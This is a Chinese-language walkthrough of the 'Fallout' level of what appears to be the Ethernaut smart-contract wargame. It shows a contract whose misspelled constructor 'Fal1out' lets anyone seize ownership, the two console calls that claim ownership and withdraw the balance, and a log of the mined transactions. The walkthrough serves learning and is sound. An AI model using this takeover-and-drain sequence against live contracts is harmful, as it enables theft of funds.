# 03_Fallout

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* 
  constructor 
  */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

获取合约ownership

owner唯一被赋值之处

```solidity
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

如果真是构造函数, 则是不可能被夺取的,  可惜这里有一个笔误: 将`Fallout` 写成了`Fal1out`, 那就是一个普通的构造函数了, 谁调用谁就是owner (￣▽￣)"

```solidity
await contract.Fal1out({value: web3.utils.toWei('0.001', 'ether')})
```

```solidity
await contract.collectAllocations()
```



## 参考答案

```

^^.js:45 | – _ – | 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:18:46.850
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x23c92e08e30abb59b0483b834d8196c7720975e1ee84450018c48832003909f4
^^.js:35 => 实例地址0x59C7894dEE51C3407b197eA04647806634bF72Cc
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:18:52.352
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x23c92e08e30abb59b0483b834d8196c7720975e1ee84450018c48832003909f4
redux-logger.js:1  action SET_BLOCK_NUM @ 16:18:57.296
contract
TruffleContract {methods: {…}, abi: Array(6), address: "0x59C7894dEE51C3407b197eA04647806634bF72Cc", transactionHash: undefined, constructor: ƒ, …}
await contract.Fal1out({value: web3.utils.toWei('0.001', 'ether')})
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xe56f7b9ad80fc6fd1b6c10f8f4a4330d54eb37fbed4c79fedef2d8f074ec279f
{tx: "0xe56f7b9ad80fc6fd1b6c10f8f4a4330d54eb37fbed4c79fedef2d8f074ec279f", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xe56f7b9ad80fc6fd1b6c10f8f4a4330d54eb37fbed4c79fedef2d8f074ec279f
redux-logger.js:1  action SET_BLOCK_NUM @ 16:21:57.334
await contract.collectAllocations()
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x7221524c288407e9e2755897247649b1eb6aae1162e0391084c4a9d4dbb07ceb
{tx: "0x7221524c288407e9e2755897247649b1eb6aae1162e0391084c4a9d4dbb07ceb", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x7221524c288407e9e2755897247649b1eb6aae1162e0391084c4a9d4dbb07ceb
redux-logger.js:1  action SET_BLOCK_NUM @ 16:22:27.308
^^.js:45 ^⨀ᴥ⨀^ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:23:22.856
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x9e508c838b15998f4889e34584bc894ba25d6570aba4eb8b90982a0f8a3cb9b2
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:23:28.360
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x9e508c838b15998f4889e34584bc894ba25d6570aba4eb8b90982a0f8a3cb9b2
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:73 (っ◕‿◕)っ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:23:37.304

```



